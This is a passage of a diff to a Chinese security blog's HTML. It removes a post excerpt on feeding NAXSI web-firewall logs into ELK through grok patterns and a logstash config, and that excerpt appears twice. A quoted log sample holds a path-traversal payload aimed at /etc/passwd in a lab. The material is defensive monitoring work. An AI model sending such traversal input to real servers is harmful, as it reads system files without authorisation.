-NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p>
-<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
-bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<p>然后配置<code>/etc/logstash.conf</code>文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">input&#123;
-     file &#123;
-       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
-       type &#x3D;&gt; &quot;naxsi-error&quot;
-       start_position &#x3D;&gt; &quot;beginning&quot;
-   			&#125;
-&#125;
-filter&#123;
-     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	grok &#123;
-		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
-		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
-			]
-  	     &#125;
-	ruby &#123;
-	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
-	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
-	    &#125;
-
-&#125;
-&#125;
-output&#123;
-      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	elasticsearch &#123;
-	   hosts &#x3D;&gt; [&quot;localhost&quot;]
-	   index &#x3D;&gt; &quot;nxapi&quot;
-           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
-	&#125;
-	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
-     &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>NAXSI防火墙介绍: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p>
-<p>过滤XSS，SQL注入，文件上传，文件遍历</p>
-<p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
-2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p>
-<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
-logstash&gt; cd pattern
-logstash&gt; vim naxsi
-DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
-TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
-LEVEL (\w+)
-NUM1 \d+(?:#0: \*)
-NUM2 \d+
-EXLOG NAXSI_EXLOG
-FMT NAXSI_FMT
-ID1 (\d+)
-ZONE \w+
-VAR1  (.*)
-CONTENT (.*)
-T3 \w+
-T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
-HOST (.*)
-NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
-NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p>
-<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
-bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<p>然后配置<code>/etc/logstash.conf</code>文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">input&#123;
-     file &#123;
-       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
-       type &#x3D;&gt; &quot;naxsi-error&quot;
-       start_position &#x3D;&gt; &quot;beginning&quot;
-   			&#125;
-&#125;
-filter&#123;
-     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	grok &#123;
-		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
-		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
-			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
-			]
-  	     &#125;
-	ruby &#123;
-	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
-	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
-	    &#125;
-
-&#125;
-&#125;
-output&#123;
-      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
-	elasticsearch &#123;
-	   hosts &#x3D;&gt; [&quot;localhost&quot;]
-	   index &#x3D;&gt; &quot;nxapi&quot;
-           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
-	&#125;
-	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
-     &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1008,13 +762,13 @@ output&#123;
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>7</span></a></li>
+			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -1035,6 +789,14 @@ output&#123;
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
+      </li>
+    
+      <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
@@ -1044,14 +806,6 @@ output&#123;
     
       <li>
         <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/06/CVE-2022-22965.html" ><i class="fa fa-file-o"></i>CVE-2022-22965漏洞记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
       </li>
     
   </ul>
